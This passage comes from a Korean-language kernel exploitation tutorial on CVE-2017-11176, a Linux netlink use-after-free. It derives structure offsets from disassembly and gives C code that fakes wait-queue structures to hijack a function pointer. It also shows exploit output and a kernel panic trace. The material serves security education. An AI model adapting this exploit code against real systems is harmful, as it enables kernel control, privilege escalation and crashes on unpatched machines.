ffffffff8106190d:       41 83 e4 01             and    r12d,0x1                 // test "flags & WQ_FLAG_EXCLUSIVE"
ffffffff81061911:       74 06                   je     0xffffffff81061919       // goto next element
ffffffff81061913:       83 6d c8 01             sub    DWORD PTR [rbp-0x38],0x1 // decrement "nr_exclusive"
ffffffff81061917:       74 0d                   je     0xffffffff81061926       // "break" statement
```

*list\_for\_each\_entry\_safe()* 매크로를 반복하고 필요하다면 점프를 통해 돌아간다:

```asm
ffffffff81061919:       48 8d 43 18             lea    rax,[rbx+0x18]           // "pos = n"
ffffffff8106191d:       48 8b 53 18             mov    rdx,QWORD PTR [rbx+0x18] // "n = list_next_entry()"
ffffffff81061921:       49 39 c5                cmp    r13,rax                  // compare to wait queue head
ffffffff81061924:       75 ca                   jne    0xffffffff810618f0       // loop back (next element)
```

즉 wait queue 요소의 오프셋은 다음과 같다:

```c
struct __wait_queue {
    unsigned int flags;               // <----- offset = 0x00 (padded)
#define WQ_FLAG_EXCLUSIVE   0x01
    void *private;                    // <----- offset = 0x08
    wait_queue_func_t func;           // <----- offset = 0x10
    struct list_head task_list;       // <----- offset = 0x18
};
```

게다가 우린 *wait\_queue\_head\_t* 구조체의 "task\_list" 필드가 오프셋 0x8에 위치한 걸 알고 있다.

예측 가능한 값이었지만 arbitrary call primitive가 실행되는 지점(**0xffffffff81061906**)을 정확하게 알기 위해 코드를 어셈블리에서 이해하는 게 중요하다. 이는 디버깅 시에 굉장히 유용하다. 게다가 [part 4](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html)에서 *꼭 필요한* 여러 레지스터의 상태를 알게 되었다.

다음 단계는 *struct netlinksock*에 있는 *wait* 필드의 주소를 찾는 것이다. 이 주소는 *wake\_up\_interruptible()*을 호출하는 **netlink\_setsockopt()**를 통해 얻을 수 있다:

```c
static int netlink_setsockopt(struct socket *sock, int level, int optname,
                  char __user *optval, unsigned int optlen)
{
    struct sock *sk = sock->sk;
    struct netlink_sock *nlk = nlk_sk(sk);
    unsigned int val = 0;
    int err;

  // ... cut ...

    case NETLINK_NO_ENOBUFS:
        if (val) {
            nlk->flags |= NETLINK_RECV_NO_ENOBUFS;
            clear_bit(0, &nlk->state);
            wake_up_interruptible(&nlk->wait);    // <---- first arg has our offset!
        } else
            nlk->flags &= ~NETLINK_RECV_NO_ENOBUFS;
        err = 0;
        break;

  // ... cut ...
}
```

**노트**: 이전 섹션에서 *groups* 필드가 *0x2a0*에 위치하는 것을 알았다. 구조체 레이아웃을 생각해보면 오프셋이 *0x2b0*같은 식일 거라 *추측할* 수 있지만, 검증이 필요하다. 항상 그렇게 분명하지만은 않다.

*netlink\_setsockopt()*는 *\_\_wake\_up\_common()*보다 큰 함수다. IDA같은 디스어셈블러가 없다면 함수가 끝나는 지점을 잡기 어려울 것이다. 그러나 함수 전체를 리버싱할 필요는 없다! 그냥 *\_\_wake\_up()*을 실행하는 *wake\_up\_interruptable()* 매크로를 호출하는 지점을 찾기만 하면 된다. 이 호출을 찾아보자!

```bash
$ egrep "netlink_setsockopt| __wake_up$" System.map-2.6.32 
ffffffff81066560 T __wake_up
ffffffff814b8090 t netlink_setsockopt
```

결과는 다음과 같다:

```asm
ffffffff814b81a0:       41 83 8c 24 94 02 00    or     DWORD PTR [r12+0x294],0x8    // nlk->flags |= NETLINK_RECV_NO_ENOBUFFS
ffffffff814b81a7:       00 08 
ffffffff814b81a9:       f0 41 80 a4 24 a8 02    lock and BYTE PTR [r12+0x2a8],0xfe  // clear_bit()
ffffffff814b81b0:       00 00 fe 
ffffffff814b81b3:       49 8d bc 24 b0 02 00    lea    rdi,[r12+0x2b0]              // 1st arg = &nlk->wait
ffffffff814b81ba:       00 
ffffffff814b81bb:       31 c9                   xor    ecx,ecx                      // 4th arg = NULL (key)
ffffffff814b81bd:       ba 01 00 00 00          mov    edx,0x1                      // 3nd arg = 1 (nr_exclusive)
ffffffff814b81c2:       be 01 00 00 00          mov    esi,0x1                      // 2nd arg = TASK_INTERRUPTIBLE
ffffffff814b81c7:       e8 94 e3 ba ff          call   0xffffffff81066560           // call __wake_up()
ffffffff814b81cc:       31 c0                   xor    eax,eax                      // err = 0
ffffffff814b81ce:       e9 e9 fe ff ff          jmp    0xffffffff814b80bc           // jump to exit
```

우리의 직관대로 오프셋은 **0x2b0**이다.

훌륭하다! 이제 *netlink\_sock* 구조체에 있는 *wait*의 오프셋이 뭐고 wait queue 요소의 레이아웃이 어떤지 알게 되었다. 게다가 arbitrary call primitive가 실행되는 지점을 정확하게 알고 있다(디버깅이 쉬워진다). 그럼 커널 구조체를 *모방하여* 재할당 데이터를 채워보자.

### Mimicking Kernel Data Structure

하드코딩된 오프셋을 넣어 익스플로잇을 짜면 코드가 읽기 어려워지기 때문에, 항상 커널 구조체를 *모방하는* 것이 좋다. 아무 실수도 안 했다는 걸 확인하기 위해 *뻔뻔스럽게*(shamelessly) **MAYBE\_BUILD\_BUG\_ON** 매크로를 수정하여 *static\_assert* 매크로를 만들 것이다(= 컴파일 시간에 체크).

```c
#define BUILD_BUG_ON(cond) ((void)sizeof(char[1 - 2 * !!(cond)]))
```

조건이 true라면 음의 크기를 가진 배열을 선언하여 컴파일 에러를 낼 것이다. 꽤 유용하지 않은가!

간단한 구조체를 *모방하는* 것은 쉽다. 커널이 하는 것처럼 선언해주기만 하면 된다:

```c
// target specific offset
#define NLK_PID_OFFSET            0x288
#define NLK_GROUPS_OFFSET         0x2a0
#define NLK_WAIT_OFFSET           0x2b0
#define WQ_HEAD_TASK_LIST_OFFSET  0x8
#define WQ_ELMT_FUNC_OFFSET       0x10
#define WQ_ELMT_TASK_LIST_OFFSET  0x18

struct list_head
{
  struct list_head *next, *prev;
};

struct wait_queue_head
{
  int slock;
  struct list_head task_list;
};

typedef int (*wait_queue_func_t)(void *wait, unsigned mode, int flags, void *key);

struct wait_queue
{
  unsigned int flags;
#define WQ_FLAG_EXCLUSIVE 0x01
  void *private;
  wait_queue_func_t func;
  struct list_head task_list;
};
```

바로 이거다!

반면에 *netlink\_sock*을 모방하고 싶으면 올바른 레이아웃을 갖기 위해 몇 몇 *padding*을 넣어줘야 한다. 그렇지 않으면 최악의 경우 모든 "내장된" 구조체를 다시 구현해야 할 수도 있다. 우린 (재할당 검증을 위해) "wait", "pid", "group" 필드만 참조하면 되기 때문에 여기서 *netlink\_sock*을 모방하진 않을 것이다

### Finalize The Reallocation Data

좋다, 이제 우리의 구조체가 만들어졌으니 유저 영역 wait queue 요소와 "가짜" 다음 요소를 전역으로 선언하자:

```c
static volatile struct wait_queue g_uland_wq_elt;
static volatile struct list_head  g_fake_next_elt;
```

그리고 재할당 데이터 내용을 마무리짓는다:

```c
#define PANIC_ADDR ((void*) 0xffffffff81553684)

static int init_realloc_data(void)
{
  struct cmsghdr *first;
  int* pid = (int*)&g_realloc_data[NLK_PID_OFFSET];
  void** groups = (void**)&g_realloc_data[NLK_GROUPS_OFFSET];
  struct wait_queue_head *nlk_wait = (struct wait_queue_head*) &g_realloc_data[NLK_WAIT_OFFSET];

  memset((void*)g_realloc_data, 'A', sizeof(g_realloc_data));

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) &g_realloc_data;
  first->cmsg_len = sizeof(g_realloc_data);
  first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
  first->cmsg_type = 1; // <---- ARBITRARY VALUE

  // used by reallocation checker
  *pid = MAGIC_NL_PID;
  *groups = MAGIC_NL_GROUPS;

  // the first element in nlk's wait queue is our userland element (task_list field!)
  BUILD_BUG_ON(offsetof(struct wait_queue_head, task_list) != WQ_HEAD_TASK_LIST_OFFSET);
  nlk_wait->slock = 0;
  nlk_wait->task_list.next = (struct list_head*)&g_uland_wq_elt.task_list;
  nlk_wait->task_list.prev = (struct list_head*)&g_uland_wq_elt.task_list;

  // initialise the "fake" second element (because of list_for_each_entry_safe())
  g_fake_next_elt.next = (struct list_head*)&g_fake_next_elt; // point to itself
  g_fake_next_elt.prev = (struct list_head*)&g_fake_next_elt; // point to itself

  // initialise the userland wait queue element
  BUILD_BUG_ON(offsetof(struct wait_queue, func) != WQ_ELMT_FUNC_OFFSET);
  BUILD_BUG_ON(offsetof(struct wait_queue, task_list) != WQ_ELMT_TASK_LIST_OFFSET);
  g_uland_wq_elt.flags = WQ_FLAG_EXCLUSIVE; // set to exit after the first arbitrary call
  g_uland_wq_elt.private = NULL; // unused
  g_uland_wq_elt.func = (wait_queue_func_t) PANIC_ADDR; // <----- arbitrary call! 
  g_uland_wq_elt.task_list.next = (struct list_head*)&g_fake_next_elt;
  g_uland_wq_elt.task_list.prev = (struct list_head*)&g_fake_next_elt;
  printf("[+] g_uland_wq_elt addr = %p\n", &g_uland_wq_elt);
  printf("[+] g_uland_wq_elt.func = %p\n", g_uland_wq_elt.func);

  return 0;
}
```

왜 이게 하드코딩된 오프셋보다 덜 *에러가 나는지* 보이는가?

재할당 데이터의 레이아웃은 다음과 같이 된다:

![Reallocation Final](https://blog.lexfo.fr/images/cve-2017-11176-linux/realloc_final.png)

이제 재할당 데이터는 끝이다! 😁

### Trigger The Arbitrary Call Primitive

마지막으로, 메인 스레드에서 arbitrary call primitive를 트리거해야 한다. part 2를 통해 경로를 이미 알고 있으므로, 다음 코드가 간단해야 한다(?).

```c
int main(void)
{
  // ... cut ...

  printf("[+] reallocation succeed! Have fun :-)\n");

  // trigger the arbitrary call primitive
  val = 3535; // need to be different than zero
  if (_setsockopt(unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
  {
    perror("[-] setsockopt");
    goto fail;
  }

  printf("[ ] are we still alive ?\n");
  PRESS_KEY();

  // ... cut ...
}
```

### Exploit Results

이제 익스플로잇을 실행하여 작동하는지 볼 시간이다! 커널 크래시가 나기 때문에 가상 머신에서 *dmesg* 결과를 보긴 힘들 것이다. [netconsole](https://www.kernel.org/doc/Documentation/networking/netconsole.txt)을 이용하는 것을 강력 추천한다!

익스플로잇을 실행해보자:

```plaintext
[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
[ ] optmem_max = 20480
[+] can use the 'ancillary data buffer' reallocation gadget!
[+] g_uland_wq_elt addr = 0x602820
[+] g_uland_wq_elt.func = 0xffffffff81553684
[+] reallocation data initialized!
[ ] initializing reallocation threads, please wait...
[+] 300 reallocation threads ready!
[+] reallocation ready!
[ ] preparing blocking netlink socket
[+] socket created (send_fd = 603, recv_fd = 604)
[+] netlink socket bound (nl_pid=118)
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink socket created = 604
[+] netlink fd duplicated (unblock_fd=603, sock_fd2=605)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 604 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 605 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
```

**노트**: "reallocation succeed" 메시지가 안 보이는 이유는 콘솔에 출력되기 이전에 커널 크래시가 나기 때문이다(버퍼엔 올라간다).

다음은 *netconsole* 결과이다:

```plaintext
[  213.352742] Freeing alive netlink socket ffff88001bddb400
[  218.355229] Kernel panic - not syncing: ^A
[  218.355434] Pid: 2443, comm: exploit Not tainted 2.6.32
[  218.355583] Call Trace:
[  218.355689]  [<ffffffff8155372b>] ? panic+0xa7/0x179
[  218.355927]  [<ffffffff810665b3>] ? __wake_up+0x53/0x70
[  218.356045]  [<ffffffff81061909>] ? __wake_up_common+0x59/0x90
[  218.356156]  [<ffffffff810665a8>] ? __wake_up+0x48/0x70
[  218.356310]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c/0x1c0
[  218.356460]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f/0xc0
[  218.356622]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16/0x1b
```

**승리했다!** 성공적으로 *netlink\_setsockopt()*로부터 *panic()*을 호출했다!

**이제 커널 실행 흐름을 제어하고 있는 것이다! *arbitrary call primitive*는 익스플로잇되었다. 😊**

- - -

## Conclusion

*후.. 오래 걸렸다!*

이번 파트에서 많은 것을 봤다. 첫 번째로 SLAB allocator를 중심으로 메모리 하위 시스템을 소개했다. 게다가, 커널 어디서든 사용되는 중요한 구조체(*list\_head*)와 *container\_of* 매크로를 보았다.

두 번째로 *use-after-free* 버그가 무엇인지와 리눅스 커널에서 *type confusion*을 이용해 *use-after-free*를 익스플로잇하는 일반적인 전략을 보았다. 익스플로잇을 하기 전에 모아야 하는 일반적인 정보들의 중요성을 강조했고 KASAN을 통해 그런 정보를 쉽게 얻을 수 있다는 걸 알 수 있었다. 우리가 이용하는 버그에 대한 정보를 모았고, 정적으로 혹은 동적으로 캐시 오브젝트의 크기를 얻는 여러 방법(pahole, /proc/slabinfo, ...)을 접했다.

세 번째로는 리눅스 커널에서 *잘 알려진* "ancillary data buffer" 가젯(*sendmsg()*)을 이용하여 재할당을 하는 방법에 대해 다루고, 뭐가 제어 가능한 것인지 그리고 그걸 어떻게 (거의) 임의의 내용을 재할당하는 데 사용될 수 있는지 보았다. 구현 과정에서 재할당 실패를 최소화하는 두 가지 간단한 트릭(cpumask와 heap spraying)을 보았다.

마지막으로 우리의 모든 *uaf primitive*가 어디 있었는지(primitive gates) 드러냈다. 그 중 하나를 재할당 상태(uncontrolled read)를 체크하는 데, 다른 하나를 (wait queue로부터) arbitrary call을 얻는 데 사용했다. 구현에서 커널 구조체를 모방하고 어셈블리 코드로부터 타겟의 특정 오프셋을 추출했다. 최종적으로 현재의 익스플로잇에서 *panic()*을 호출할 수 있게 되었고, 이는 우리가 커널 실행 흐름에 대한 제어를 하고 있다는 뜻이다.

다음(이자 마지막) 파트에선 *stack pivot*, *ROP chain*를 arbitrary call에 이용하여 ring-0를 장악하는 방법을 배울 것이다. 유저 영역의 ROP 익스플로잇과는 다르게 커널에선 추가적인 요구 사항과 (우리가 극복할) 고려할 사항들(page faults, SMEP)이 있다. 마지막엔 커널을 보수하여 익스플로잇이 끝날 때 크래시가 나지 않고 우리의 권한이 올라가도록 만들 것이다.

이 리눅스 커널에서의 여정을 즐기길 바라며, [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 보자.
